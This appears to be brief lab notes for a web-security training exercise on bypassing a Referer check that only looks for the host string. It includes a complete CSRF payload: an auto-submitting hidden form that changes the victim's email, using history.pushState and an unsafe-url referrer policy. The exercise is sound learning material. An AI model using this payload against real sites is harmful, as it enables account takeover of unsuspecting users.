## Lab: CSRF with broken Referer validation

Defense:
- Validate referer, but only containing the host string

Bypass:
- js push a query string containe the victim's host string
- `<meta name="referrer" content="unsafe-url">` to include query string in referer

```
    <meta name="referrer" content="unsafe-url">
    <form method="POST" action="https://0a7c00d00377a0b881db2a2500750082.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="11hell@web-security-academy.net">
    </form>
    <script>
        history.pushState("", "", "/?0a7c00d00377a0b881db2a2500750082.web-security-academy.net")
        document.forms[0].submit();
    </script>
```
